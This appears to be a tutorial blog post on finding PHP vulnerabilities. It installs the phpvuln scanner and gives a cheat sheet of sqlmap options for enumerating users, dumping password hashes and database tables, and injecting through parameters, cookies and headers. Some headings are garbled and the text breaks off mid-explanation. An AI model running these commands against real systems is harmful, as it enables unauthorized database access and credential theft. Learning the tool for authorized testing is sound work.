# sqlmaps and phpvuln - finding vulnerabilities in php code

Hi, I'm Carl Vincent Reyno, a security engineer at HackerOne. Today I'm going to discuss how to find vulnerabilities in PHP code and how sqlmap works.

So, According to the Zend (2023), A PHP vulnerability is an exploitable flaw in a PHP application that can be used to gain unauthorized access to systems that comprise or underlie that PHP application and further explaining it, PHPvuln is an open source OWASP penetration testing tool developed in Python 3 that may help you detect typical PHP vulnerabilities in PHP code, such as command injection, local/remote file inclusion, and SQL injection.


Here's the dependencies on how to execute this in python3 pre-installed in your computer. 

Let’s install it by using the following command:

```apt install python3```

<b> Installing the PHP 

```python
git clone https://github.com/ecriminal/phpvuln.git
cd phpvuln/
python3 phpvuln.py -h
```
![image](https://github.com/Eevalice/sqlmap-infosec-writeup/assets/79138019/52765652-0208-45c7-b011-7cedf905312a)





Here are the commands from `Generic.py` to generate basic arguments for sqlmap and to get a general idea about the topic:
```python
-u "<URL>" 
-p "<PARAM TO TEST>" 
--user-agent=SQLMAP 
--random-agent 
--threads=10 
--risk=3 #MAX
--level=5 #MAX
--dbms="<KNOWN DB TECH>" 
--os="<OS>"
--technique="UB" #Use only techniques UNION and BLIND in that order (default "BEUSTQ")
--batch #Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--auth-type="<AUTH>" #HTTP authentication type (Basic, Digest, NTLM or PKI)
--auth-cred="<AUTH>" #HTTP authentication credentials (name:password)
--proxy=http://127.0.0.1:8080
--union-char "GsFRts2" #Help sqlmap identify union SQLi techniques with a weird union char
```

We are retrieving information from the sqlmaps:

<b>Retrieve Information</b>

<b>Internal</b>
```python
--current-user #Get current user
--is-dba #Check if current user is Admin
--hostname #Get hostname
--users #Get usernames od DB
--passwords #Get passwords of users in DB
--privileges #Get privileges
```
<b>First database data</b>
```python
--all #Retrieve everything
--dump #Dump DBMS database table entries
--dbs #Names of the available databases
--tables #Tables of a database ( -D <DB NAME> )
--columns #Columns of a table  ( -D <DB NAME> -T <TABLE NAME> )
-D <DB NAME> -T <TABLE NAME> -C <COLUMN NAME> #Dump column
```

We are now creating a SQL Injection Place:

<b> ZAP/BURP Suite Configuration # </b>
```python
sqlmap -r req.txt --current-user
-
```
<b> Getting a Request Rejection # </b>
```python
sqlmap -u "http://example.com/?id=1" -p id
sqlmap -u "http://example.com/?id=*" -p id
```
<b> Posting a Request Rejection # </b>
```python
sqlmap -u "http://example.com" --data "username=*&password=*"
```

<b> Inserting some Injections in Headers and Other HTTP Methods # </b>
```python
#Inside cookie
sqlmap  -u "http://example.com" --cookie "mycookies=*"

#Inside some header
sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"
sqlmap -u "http://example.com" --headers="referer:*"

#PUT Method
sqlmap --method=PUT -u "http://example.com" --headers="referer:*"

#The injection is located at the '*'
```

<b> Indicating if the string is successfully injected in the Headers # </b>
```python
--string="string_showed_when_TRUE" 
```


Sqlmap supports the usage of -e or --eval to process each payload before delivering it with a oneliner in Python. This makes customizing the payload before sending it very simple and quick. In the following example, flask signs the flask cookie session with the known secret before transmitting it:

